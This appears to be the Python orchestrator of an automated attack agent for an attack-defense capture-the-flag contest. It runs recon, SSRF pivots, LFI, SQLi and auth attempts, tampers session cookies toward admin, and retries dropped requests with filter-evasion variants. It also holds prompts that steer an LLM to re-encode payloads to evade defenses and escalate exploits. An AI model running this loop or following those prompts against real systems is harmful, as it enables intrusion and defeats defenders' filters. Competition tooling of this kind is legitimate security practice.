"""수명주기 오케스트레이터 — 관측 → 계획 → 실행 → 제출.

설계 §9.4·§9.5·§9.10·§9.13. 구성요소를 typed egress·Round 비밀 저장소·증거 binding으로 엮어
공정 스케줄러로 표적을 순회한다. 각 계획은 실행 직전 capability·Round·endpoint·TTL·증거·부작용을
재검증하고, 상대 방어 필터에 DROP되면 시그니처 회피 변형으로 재시도한다. 오류는 표적 단위로
격리하고, Round 종료 시 비밀 원문·증거·중복 집합을 폐기한다.
"""

from __future__ import annotations

import time
import threading
from concurrent.futures import ThreadPoolExecutor

from .audit import AuditLogger, Redactor
from .config import AttackerConfig
from .egress import EgressError, EgressGateway, build_allowlists
from .exploits import (
    Attempt,
    auth_tamper_attempts,
    build_attempts,
    extract_internal_urls,
    observed_attempts,
    ssrf_pivot_attempts,
    tamper_token,
    uses_observed_read_only_interface,
)
from .flags import FlagPipeline, SubmitClient
from .llm_advisor import LLMAdvisor
from .models import (
    Capability,
    ExecutionPlan,
    Outcome,
    RoundBudget,
    SideEffectClass,
    SubmitState,
    VulnClass,
)
from .observation import EvidenceFactory, Observer, UrllibHttp
from .phase_policy import FairScheduler, cumulative_endpoint_order
from .planner import EndpointState, Planner
from .playbook import Playbook
from .profiles import service_fingerprint, suggest_vuln_classes
from .rate_limit import RateLimiter
from .recon import COMMON_PROBE_PATHS
from .round_report import RoundReport
from .secrets import KIND_LLM_KEY, KIND_SUBMIT_TOKEN, RoundSecretStore
from .tools import ExecutionAdapter, PlanBindingError, evasion_variants

LOOP_SLEEP = 4.0
PER_TARGET_BUDGET = 1
MAX_EVASION_VARIANTS = 6
ENDPOINT_RETRY_COOLDOWN = 30.0
PLAN_TTL = 30.0
EVIDENCE_TTL = 90.0
ROUND_DURATION = 20 * 60.0  # Round 20분 → 제출 재시도 경계
MAX_DISCOVERY_TEXT = 4096
MAX_DISCOVERY_BODY = 512


class AttackerRuntime:
    """공격 런타임. 의존성 주입 가능(네트워크 없이 테스트)."""

    def __init__(self, config: AttackerConfig, http=None, rate=None,
                 clock=time.monotonic, sleep=time.sleep, audit=None, budget=None):
        self.config = config
        self.transport = http or UrllibHttp()
        self.rate = rate or RateLimiter(clock=clock, sleep=sleep)
        self.clock = clock
        self.sleep = sleep
        self.budget = budget or RoundBudget()
        # 로그에서 제출 토큰·LLM 키를 제거(원문은 저장소로 옮기지만 config가 origin).
        self.audit = audit or AuditLogger(Redactor({config.submit_token, config.llm_api_key}))
        self._round_seq = 0
        # run_once에서 설정하는 Round 한정 컴포넌트
        self._round_id = ""
        self._round_deadline = 0.0
        self._secret_store = None
        self._observer = None
        self._adapter = None
        self._pipeline = None
        self._planner = None
        self._report = None
        self._playbook = None
        self._round_active = False
        self._state_lock = threading.Lock()
        self._stop_event = threading.Event()
        self._completed_endpoints = set()
        self._endpoint_retry_state = {}
        self._latest_evidence_refs = {}

    def request_stop(self) -> None:
        """새 요청을 중단하고 single-flight 대기 worker를 깨운다."""
        self._stop_event.set()
        if self._playbook is not None:
            self._playbook.cancel_inflight()

    # ---- Round 컨텍스트 구성 ----

    def _build_round(self) -> None:
        self._round_seq += 1
        self._round_id = f"round-{self._round_seq}"
        self.budget.reset()  # 라운드별 예산 격리 — 누적 상한/보고 왜곡 방지
        now = self.clock()
        self._round_deadline = now + ROUND_DURATION
        store = RoundSecretStore(self._round_id, clock=self.clock)
        submit_handle = (store.put(KIND_SUBMIT_TOKEN, self.config.submit_token)
                         if self.config.submit_token else None)
        llm_handle = (store.put(KIND_LLM_KEY, self.config.llm_api_key)
                      if self.config.llm_api_key else None)
        self._secret_store = store

        egress = EgressGateway(self.transport, build_allowlists(self.config))
        evidence = EvidenceFactory(self._round_id, self.clock, EVIDENCE_TTL)

        self._observer = Observer(egress, self.rate, self._round_id, self.clock, evidence)
        self._adapter = ExecutionAdapter(egress, self.rate, self._round_id, self.clock, evidence)
        advisor = LLMAdvisor(egress, self.config, self.budget, store, llm_handle)
        self._planner = Planner(advisor)
        submit_client = SubmitClient(
            egress, self.rate, self.config.submit_url, submit_handle, store,
            clock=self.clock, sleep=self.sleep, round_deadline=self._round_deadline)
        self._pipeline = FlagPipeline(submit_client, store)
        self._report = RoundReport(budget=self.budget)
        self._playbook = Playbook()  # Round 한정 교차 재사용(비밀 없음)
        with self._state_lock:
            self._completed_endpoints.clear()
            self._endpoint_retry_state.clear()
            self._latest_evidence_refs.clear()

    def start_round(self) -> RoundReport:
        """공식 Round를 연다. 이미 열려 있으면 같은 Round를 유지한다."""
        if not self._round_active:
            self._build_round()
            self._round_active = True
        return self._report

    def _finish_round(self) -> None:
        """Round 비밀을 폐기한다. 반복 호출해도 안전하다."""
        if not self._round_active:
            return
        self._secret_store.expire_all()
        with self._state_lock:
            self._completed_endpoints.clear()
            self._endpoint_retry_state.clear()
            self._latest_evidence_refs.clear()
        self._round_active = False

    def finish_round(self) -> None:
        """공식 Round를 종료하고 비밀 원문을 폐기한다."""
        self._finish_round()

    def _bind_plan(self, plan: ExecutionPlan, endpoint, evidence_ref) -> ExecutionPlan:
        now = self.clock()
        plan.plan_id = f"plan-{self._round_id}-{endpoint.endpoint_id}-{now}"
        plan.round_id = self._round_id
        plan.endpoint_id = endpoint.endpoint_id
        plan.capability = Capability.ATTACK_TARGET
        plan.evidence_refs = [evidence_ref] if evidence_ref else []
        plan.created_at_monotonic = now
        plan.expires_at_monotonic = now + PLAN_TTL
        if plan.side_effect_class is None:
            plan.side_effect_class = SideEffectClass.READ_ONLY
        return plan

    # ---- flag 처리 ----

    def _process_flags(self, body: str, headers=None) -> bool:
        """본문과 응답 헤더의 flag를 모두 처리한다.

        반환값은 이 호출에서 **새로 제출해 accepted 된 flag가 있는가**다. 이미 같은
        Round에서 처리한 flag를 다시 본 것은 endpoint 탐색 진전으로 세지 않는다.
        """
        newly_accepted = False
        texts = [body or ""]
        texts.extend(str(value) for value in (headers or {}).values() if value is not None)
        for text in texts:
            for fp, state, submitted in self._pipeline.process(text):
                if submitted:
                    self._report.record_submit(fp, state)
                if submitted and state == SubmitState.ACCEPTED:
                    newly_accepted = True
        return newly_accepted

    def _remember_evidence(self, endpoint, evidence_ref) -> None:
        if evidence_ref is None:
            return
        with self._state_lock:
            self._latest_evidence_refs[endpoint.endpoint_id] = evidence_ref

    def _latest_evidence(self, endpoint, fallback=None):
        with self._state_lock:
            return self._latest_evidence_refs.get(endpoint.endpoint_id, fallback)

    @staticmethod
    def _binding_reason(exc: PlanBindingError) -> str:
        message = str(exc)
        if "증거" in message:
            return "evidence-stale-or-missing"
        if "TTL" in message:
            return "plan-expired"
        if "Round" in message:
            return "round-mismatch"
        if "endpoint" in message:
            return "endpoint-mismatch"
        if "부작용" in message or "변경 작업" in message:
            return "side-effect-gate"
        return "binding-invalid"

    def _feedback(self, plan: ExecutionPlan, result) -> str:
        obs = result.observation
        method, path = plan.args["method"], plan.args["path"]
        if result.outcome == Outcome.TIMEOUT:
            return (f"Your request {method} {path} got NO response (dropped/timeout) though GET / "
                    "worked — an inline filter is DROPPING it by payload signature. Re-encode to evade "
                    "while keeping the SAME exploit and target path. Reply ONLY the JSON object.")
        hdrs = "; ".join(f"{k}:{v}" for k, v in obs.redacted_header_hints.items())
        return (f"Your request {method} {path} returned HTTP {obs.status}. "
                f"Notable headers: {hdrs or '-'}. Body: {result.body[:300]}. "
                "No flag yet. Craft a DIFFERENT, more specific request escalating the SAME vuln "
                "(deeper path, schema enumeration, spoofed header, internal root). Reply ONLY the JSON object.")

    def _try_evasion(self, plan: ExecutionPlan, evidence_ref):
        """무응답(필터 DROP) 시 동일 의도의 재인코딩 변형으로 재시도한다."""
        first_success = None
        for variant in evasion_variants(
                plan.args["path"], endpoint_port=plan.target.port)[:MAX_EVASION_VARIANTS]:
            if self._stop_event.is_set():
                break
            now = self.clock()
            vplan = ExecutionPlan(
                tool=plan.tool, target=plan.target,
                args={**plan.args, "path": variant},
                plan_id=f"{plan.plan_id}-evade",
                round_id=self._round_id, endpoint_id=plan.target.endpoint_id,
                capability=Capability.ATTACK_TARGET,
                evidence_refs=[evidence_ref] if evidence_ref else [],
                created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
                side_effect_class=plan.side_effect_class,
                timeout=plan.timeout, scenario=plan.scenario, reason="evasion:" + plan.reason)
            try:
                vresult = self._adapter.execute(vplan)
            except (PlanBindingError, EgressError):
                return None, False
            self._report.record_request()
            self._remember_evidence(plan.target, vresult.observation.evidence_ref)
            if self._stop_event.is_set():
                break
            if self._process_flags(vresult.body, vresult.observation.redacted_header_hints):
                return vresult, True
            if vresult.outcome == Outcome.SUCCESS and first_success is None:
                first_success = vresult
        return first_success, False

    # ---- 결정론적 사전 정찰 (LLM 전, 토큰 0) ----

    def _recon(self, endpoint, evidence_ref) -> tuple:
        """읽기 전용 probe 응답을 bounded discovery text로 돌려준다.

        L4/UGV의 구체 route는 사전 가정하지 않는다. `/status`·`robots.txt` 등 실제 응답이
        노출한 path·parameter만 다음 결정론 공격의 배너 근거로 사용한다.
        """
        discovery = []
        captured_any = False
        for path in COMMON_PROBE_PATHS:
            if self._stop_event.is_set():
                break
            now = self.clock()
            plan = ExecutionPlan(
                tool="http", target=endpoint, args={"method": "GET", "path": path},
                plan_id=f"recon-{self._round_id}-{endpoint.endpoint_id}-{path}",
                round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
                capability=Capability.ATTACK_TARGET,
                evidence_refs=[evidence_ref] if evidence_ref else [],
                created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
                side_effect_class=SideEffectClass.READ_ONLY, reason="recon")
            try:
                result = self._adapter.execute(plan)
            except (PlanBindingError, EgressError):
                continue
            self._report.record_request()
            evidence_ref = result.observation.evidence_ref  # 다음 프로브용 신선한 증거
            self._remember_evidence(endpoint, evidence_ref)
            if self._stop_event.is_set():
                break
            if self._process_flags(result.body, result.observation.redacted_header_hints):
                self.audit.log("hit", target=endpoint.key(), path=path, reason="recon")
                captured_any = True
                # flag 원문이 포함된 응답은 discovery/LLM 입력으로 넘기지 않는다.
                continue
            body = (result.body or "").strip()
            if body:
                discovery.append(body[:MAX_DISCOVERY_BODY])
        return captured_any, "\n".join(discovery)[:MAX_DISCOVERY_TEXT], evidence_ref

    def _run_bound_exploit(self, endpoint, args, evidence_ref, reason):
        """비밀 없는 exploit 형태(method·path)를 READ_ONLY 계획으로 실행한다(playbook 재사용용)."""
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        plan = ExecutionPlan(
            tool="http", target=endpoint,
            args={"method": args.get("method", "GET"), "path": args.get("path", "/"),
                  "headers": args.get("headers", {}) or {}, "body": args.get("body", "") or ""},
            plan_id=f"pb-{self._round_id}-{endpoint.endpoint_id}",
            round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=SideEffectClass.READ_ONLY, reason=reason)
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        if self._stop_event.is_set():
            return result, False
        captured = self._process_flags(result.body, result.observation.redacted_header_hints)
        if not captured and result.outcome == Outcome.TIMEOUT:
            evaded, captured = self._try_evasion(plan, result.observation.evidence_ref)
            if evaded is not None:
                result = evaded
        return result, captured

    # ---- 결정론적 exploit 엔진 (LLM 전, 토큰 0) ----

    def _execute_attempt(self, endpoint, attempt: Attempt, evidence_ref):
        """단일 결정론 시도를 READ_ONLY 계획으로 실행한다. (result, captured) 반환.

        무응답(필터 DROP)이면 경로 재인코딩 evasion 변형으로 재시도한다.
        """
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        plan = ExecutionPlan(
            tool="http", target=endpoint,
            args={"method": attempt.method, "path": attempt.path,
                  "headers": dict(attempt.headers), "body": attempt.body or ""},
            plan_id=f"exp-{self._round_id}-{endpoint.endpoint_id}-{now}",
            round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=SideEffectClass.READ_ONLY,
            reason="det:" + attempt.reason)
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        if self._stop_event.is_set():
            return result, False
        if self._process_flags(result.body, result.observation.redacted_header_hints):
            return result, True
        if result.outcome == Outcome.TIMEOUT:
            evaded, captured = self._try_evasion(plan, result.observation.evidence_ref)
            if captured:
                return evaded, True
            if evaded is not None:
                return evaded, False
        return result, False

    @staticmethod
    def _cookie_from_headers(headers) -> tuple:
        """Set-Cookie 헤더에서 (name, value)를 뽑는다. 없으면 (None, None)."""
        for key, val in (headers or {}).items():
            if key.lower() == "set-cookie" and "=" in val:
                pair = val.split(";", 1)[0].strip()
                name, _, value = pair.partition("=")
                if name and value:
                    return name.strip(), value.strip()
        return None, None

    def _deterministic_exploit(self, endpoint, banner, banner_fp,
                               banner_headers, evidence_ref, attempts=None,
                               attempted_keys=None, include_cookie_tamper=True,
                               observed_only=False) -> bool:
        """배너 힌트로 4개 취약 부류(SSRF·LFI·AUTH·SQLI)를 토큰 0으로 시도한다.

        SSRF 2단 피벗은 base 시도 직후 **즉시** 실행한다. 승리 경로(예: /registry가 흘린
        내부 URL 재프록시)를 sweep 끝까지 미루면, 그 사이 base 요청이 표적의 rate limit을
        먼저 소진해 정작 피벗이 throttle될 수 있다. AUTH는 노출된 세션 토큰을 변조해 재전송한다.
        성공 형태는 playbook에 기록해 같은 배너의 다른 표적에 재사용한다.
        """
        hints = suggest_vuln_classes(banner)
        attempts = (build_attempts(
                        banner, hints, endpoint.port, observed_only=observed_only)
                    if attempts is None else list(attempts))
        attempted_keys = attempted_keys if attempted_keys is not None else set()
        cookie_name, cookie_val = self._cookie_from_headers(banner_headers)
        pivoted = set()            # 이미 피벗한 내부 URL(중복 방지)
        captured_any = False

        def run(attempt) -> bool:
            nonlocal evidence_ref, cookie_name, cookie_val, captured_any
            if self._stop_event.is_set():
                return False
            attempt_key = (
                attempt.method,
                attempt.path,
                tuple(sorted(attempt.headers.items())),
                attempt.body,
            )
            if attempt_key in attempted_keys:
                return False
            attempted_keys.add(attempt_key)
            result, captured = self._execute_attempt(endpoint, attempt, evidence_ref)
            if captured:
                winning_args = result.plan.args if result is not None else {
                    "method": attempt.method,
                    "path": attempt.path,
                    "headers": dict(attempt.headers),
                    "body": attempt.body,
                }
                self._playbook.record(banner_fp, {
                    "method": winning_args.get("method", attempt.method),
                    "path": winning_args.get("path", attempt.path),
                    "headers": winning_args.get("headers", dict(attempt.headers)),
                    "body": winning_args.get("body", attempt.body),
                })
                self.audit.log("hit", target=endpoint.key(),
                               path=winning_args.get("path", attempt.path),
                               vuln=attempt.vuln.value, reason="det:" + attempt.reason)
                captured_any = True
            if result is None:
                return captured
            evidence_ref = result.observation.evidence_ref
            if cookie_name is None:
                cn, cv = self._cookie_from_headers(result.observation.redacted_header_hints)
                if cn:
                    cookie_name, cookie_val = cn, cv
            # SSRF base 응답이면 즉시 2단 피벗(승리 경로를 앞당겨 표적 rate limit 전에 회수).
            # 피벗 응답 자체는 다시 피벗하지 않는다(reason 구분).
            if (attempt.vuln == VulnClass.SSRF and attempt.reason != "ssrf:pivot"
                    and "?" in attempt.path):
                base, _, query = attempt.path.partition("?")
                param = query.split("=", 1)[0]
                fresh = [u for u in extract_internal_urls(result.body) if u not in pivoted]
                pivoted.update(fresh)
                for pivot in ssrf_pivot_attempts(base, param, fresh):
                    if self._stop_event.is_set():
                        break
                    run(pivot)
            return captured

        for attempt in attempts:
            if self._stop_event.is_set():
                break
            run(attempt)

        # AUTH 세션 변조 — 노출된 토큰을 관리자 권한으로 올려 재전송한다
        if include_cookie_tamper and not observed_only and cookie_name and cookie_val:
            tokens = tamper_token(cookie_val)
            for attempt in auth_tamper_attempts(cookie_name, tokens):
                if self._stop_event.is_set():
                    break
                run(attempt)
        return captured_any

    # ---- 단일 표적 공격 ----

    def attack_endpoint(self, endpoint) -> bool:
        if self._stop_event.is_set():
            return False
        obs, resp = self._observer.observe_banner(endpoint)
        self._report.record_observation()
        self._report.record_request()
        self._remember_evidence(endpoint, obs.evidence_ref)
        if self._stop_event.is_set():
            return False
        if obs.no_response:
            self.audit.log("skip", target=endpoint.key(), reason="no-response")
            return False

        current_evidence = obs.evidence_ref
        banner_fp = service_fingerprint(obs.status, resp.body or "", resp.headers)
        banner = (resp.body or "").strip()
        captured_any = self._process_flags(resp.body, resp.headers)
        if captured_any:
            self.audit.log("hit", target=endpoint.key(), turn=0, path="/", reason="banner")
            # 한 응답 안의 본문·헤더에 있는 모든 flag는 이미 처리했다. 배너에서
            # 직접 성공한 endpoint에 추가 탐색을 붙이면 매 scan cycle마다 request
            # budget을 크게 소모하므로 여기서는 즉시 완료한다.
            return True

        attempted_keys = set()

        # TEAM1 PCAP에서 성공이 확인된 L1~L3 형태를 일반 정찰보다 먼저 실행한다.
        confirmed = observed_attempts(endpoint.port)
        observed_only = not bool(confirmed)
        if confirmed:
            captured_any = self._deterministic_exploit(
                endpoint, banner, banner_fp, resp.headers, current_evidence,
                attempts=confirmed, attempted_keys=attempted_keys,
                include_cookie_tamper=False) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        # root 배너가 취약 부류를 직접 노출하면 정찰 sweep보다 먼저 zero-token 공격한다.
        root_hints = suggest_vuln_classes(banner)
        if root_hints != [VulnClass.OTHER]:
            captured_any = self._deterministic_exploit(
                endpoint, banner, banner_fp, resp.headers, current_evidence,
                attempted_keys=attempted_keys,
                observed_only=observed_only) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        # L4/UGV를 포함한 미지 인터페이스는 실제 probe 응답에서 route를 발견한 뒤에만 공격한다.
        captured, discovery, current_evidence = self._recon(endpoint, current_evidence)
        captured_any = captured or captured_any
        if self._stop_event.is_set():
            return captured_any
        observed_banner = "\n".join(part for part in (banner, discovery) if part)

        # 결정론적 exploit 엔진 — 관측된 route·parameter를 우선해 LLM 전에 실행한다.
        captured_any = self._deterministic_exploit(
            endpoint, observed_banner, banner_fp, resp.headers, current_evidence,
            attempted_keys=attempted_keys,
            observed_only=observed_only) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        # 플래그를 찾은 endpoint도 위 bounded 관측·결정론 세트는 끝까지 수행해 같은
        # 서비스/포트의 추가 flag를 회수한다. 이미 진전이 있으면 비용이 큰 LLM까지
        # 확장하지 않고 완료한다.
        if captured_any:
            return True

        # single-flight + 재사용: 같은 배너(같은 이미지)는 한 표적만 LLM으로 풀고, 나머지는
        # 그 성공 형태(method·path·headers·body)를 재사용한다(§7.6, 제22조). 병렬 첫 사이클에
        # 11개 표적이 동시에 LLM을 두드리는 낭비를 막는다. 재사용이 이 표적에 안 맞으면
        # (표적 특정 exploit) 직접 LLM으로 이어서 푼다.
        tried_reuse = False
        while not self._stop_event.is_set():
            known = self._playbook.lookup(banner_fp)
            if (known and observed_only
                    and not uses_observed_read_only_interface(known, observed_banner)):
                # 같은 root fingerprint의 다른 서비스에서 얻은 경로라도 현 endpoint가
                # 읽기 전용 interface로 직접 노출하지 않았으면 재사용하지 않는다.
                known = None
                tried_reuse = True
            if known:
                result, captured = self._run_bound_exploit(
                    endpoint, known, current_evidence, "playbook")
                tried_reuse = True
                if captured:
                    if result is not None:
                        self._playbook.record(banner_fp, result.plan.args)
                    self.audit.log("hit", target=endpoint.key(),
                                   path=(result.plan.args.get("path") if result is not None
                                         else known.get("path")), reason="playbook")
                    return True
                if result is not None:
                    current_evidence = result.observation.evidence_ref
            slot = self._playbook.claim_or_wait(banner_fp, tried_reuse=tried_reuse)
            if self._stop_event.is_set():
                return captured_any
            if slot == "reuse":
                continue          # 대기 중 다른 표적이 새로 풀었다 — 새 항목으로 재시도
            if slot == "skip":
                return captured_any  # 다른 표적이 푸는 중 — 다음 사이클에 재사용
            break                 # slot == "solve" → 아래 LLM 루프로 직접 푼다

        state = EndpointState(endpoint)
        feedback = ""
        try:
            while (not self._stop_event.is_set()
                   and not self._planner.should_stop(state)):
                state.turn += 1
                # 승급 없이 저비용 기본 모델 고정 — 토큰 비용을 낮춰 동점 우위(제22조).
                plan = self._planner.plan_next(endpoint, observed_banner, feedback, state,
                                               model=self.config.llm_model)
                if plan is None:
                    break
                if (observed_only
                        and not uses_observed_read_only_interface(plan.args, observed_banner)):
                    self.audit.log(
                        "reject", target=endpoint.key(), turn=state.turn,
                        reason="unobserved-read-only-interface",
                    )
                    break
                self._bind_plan(plan, endpoint, current_evidence)
                try:
                    result = self._adapter.execute(plan)
                except PlanBindingError as exc:
                    binding_reason = self._binding_reason(exc)
                    if binding_reason == "evidence-stale-or-missing":
                        refresh_obs, refresh_resp = self._observer.observe_banner(endpoint)
                        self._report.record_observation()
                        self._report.record_request()
                        self._remember_evidence(endpoint, refresh_obs.evidence_ref)
                        if self._process_flags(refresh_resp.body, refresh_resp.headers):
                            self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                           path="/", reason="evidence-refresh")
                            return True
                        current_evidence = refresh_obs.evidence_ref
                        self._bind_plan(plan, endpoint, current_evidence)
                        try:
                            result = self._adapter.execute(plan)
                        except (PlanBindingError, EgressError) as retry_exc:
                            self.audit.log(
                                "reject", target=endpoint.key(), turn=state.turn,
                                reason=(self._binding_reason(retry_exc)
                                        if isinstance(retry_exc, PlanBindingError)
                                        else type(retry_exc).__name__),
                            )
                            break
                    else:
                        self.audit.log("reject", target=endpoint.key(), turn=state.turn,
                                       reason=binding_reason)
                        break
                except EgressError as exc:
                    self.audit.log("reject", target=endpoint.key(), turn=state.turn,
                                   reason=type(exc).__name__)
                    break
                self._report.record_request()
                self._remember_evidence(endpoint, result.observation.evidence_ref)

                if self._process_flags(result.body, result.observation.redacted_header_hints):
                    self._playbook.record(banner_fp, plan.args)  # 교차 재사용용 기록(비밀 없음)
                    self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                   path=plan.args["path"], vuln=str(plan.scenario),
                                   reason=plan.reason)
                    return True

                current_evidence = result.observation.evidence_ref
                if result.outcome == Outcome.TIMEOUT:
                    state.no_response_streak += 1
                    evaded, captured = self._try_evasion(plan, current_evidence)
                    if captured:
                        self._playbook.record(banner_fp, evaded.plan.args)
                        self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                       path=evaded.plan.args["path"], reason="evasion")
                        return True
                    if evaded is not None:
                        result = evaded
                        current_evidence = evaded.observation.evidence_ref
                else:
                    state.no_response_streak = 0

                feedback = self._feedback(plan, result)
        finally:
            self._playbook.finish_llm(banner_fp)  # 대기 중인 같은-배너 표적을 깨운다

        return captured_any

    # ---- 라운드 루프 ----

    def _attack_isolated(self, endpoint) -> None:
        if self._stop_event.is_set():
            return
        key = endpoint.endpoint_id
        now = self.clock()
        with self._state_lock:
            if key in self._completed_endpoints:
                return
            next_attempt, seen_generation = self._endpoint_retry_state.get(key, (0.0, -1))
        generation = self._playbook.generation
        if now < next_attempt and generation <= seen_generation:
            self.audit.log(
                "endpoint-deferred",
                target=endpoint.key(),
                reason="cooldown",
                remaining_seconds=round(next_attempt - now, 3),
                playbook_generation=generation,
                seen_generation=seen_generation,
            )
            return
        if now < next_attempt and generation > seen_generation:
            self.audit.log(
                "endpoint-retry-released",
                target=endpoint.key(),
                reason="new-playbook-generation",
                playbook_generation=generation,
                seen_generation=seen_generation,
            )
        captured = False
        stop_reason = "no-accepted-flag"
        try:
            captured = self.attack_endpoint(endpoint)
        except Exception as exc:  # 표적 단위 격리
            stop_reason = type(exc).__name__
            self.audit.log("error", target=endpoint.key(), error=type(exc).__name__)
        finally:
            scheduled = None
            with self._state_lock:
                if captured:
                    self._completed_endpoints.add(key)
                    self._endpoint_retry_state.pop(key, None)
                elif self._stop_event.is_set():
                    self._endpoint_retry_state.pop(key, None)
                else:
                    generation = self._playbook.generation
                    self._endpoint_retry_state[key] = (
                        self.clock() + ENDPOINT_RETRY_COOLDOWN,
                        generation,
                    )
                    scheduled = generation
            if scheduled is not None:
                self.audit.log(
                    "endpoint-retry-scheduled",
                    target=endpoint.key(),
                    reason=stop_reason,
                    cooldown_seconds=ENDPOINT_RETRY_COOLDOWN,
                    playbook_generation=scheduled,
                )

    def run_cycle(self) -> RoundReport:
        """열린 Round에서 엔드포인트 전체를 한 번 공격한다(병렬, 전역 rate limit 공유).

        concurrency<=1 이거나 표적이 1개면 결정론적 순차 경로를 쓴다.
        """
        if not self._round_active:
            raise RuntimeError("start_round() must be called before run_cycle()")
        endpoints = cumulative_endpoint_order(self.config.endpoints())
        workers = min(self.config.concurrency, max(1, len(endpoints)))
        if workers <= 1:
            # 순차(결정론) — 공정 스케줄러로 순회
            sched = FairScheduler(endpoints, per_target_budget=PER_TARGET_BUDGET)
            while not self._stop_event.is_set():
                endpoint = sched.next()
                if endpoint is None:
                    break
                sched.charge(endpoint)
                self._attack_isolated(endpoint)
        else:
            # 병렬 — 표적별 스레드가 전역 rate limit·공유 상태(락)를 공유
            with ThreadPoolExecutor(max_workers=workers) as pool:
                for fut in [pool.submit(self._attack_isolated, e) for e in endpoints
                            if not self._stop_event.is_set()]:
                    fut.result()
        return self._report

    def run_once(self) -> RoundReport:
        """독립된 한 Round를 열고 한 번의 scan cycle을 실행한다."""
        if self._round_active:
            raise RuntimeError("run_once() cannot run during an active Round")
        self.start_round()
        try:
            return self.run_cycle()
        finally:
            self.finish_round()

    def run_forever(self, max_cycles=None) -> None:
        self.audit.log("startup", targets=len(self.config.targets),
                       ports=len(self.config.ports), can_attack=self.config.can_attack,
                       can_submit=self.config.can_submit, model=self.config.llm_model)
        if not self.config.can_attack:
            self.audit.log("inert", reason="표적 없음 — fail-open, 공격 없음")
            return
        if not self.config.can_submit:
            self.audit.log("warn", reason="제출 설정 없음 — flag 획득해도 제출 불가")
        self.start_round()
        try:
            cycles = 0
            while ((max_cycles is None or cycles < max_cycles)
                   and self.clock() < self._round_deadline
                   and not self._stop_event.is_set()):
                report = self.run_cycle()
                self.audit.log("round-summary", **report.summary())
                cycles += 1
                cycles_remaining = max_cycles is None or cycles < max_cycles
                remaining = self._round_deadline - self.clock()
                if cycles_remaining and remaining > 0:
                    self.sleep(min(LOOP_SLEEP, remaining))
        finally:
            self.finish_round()
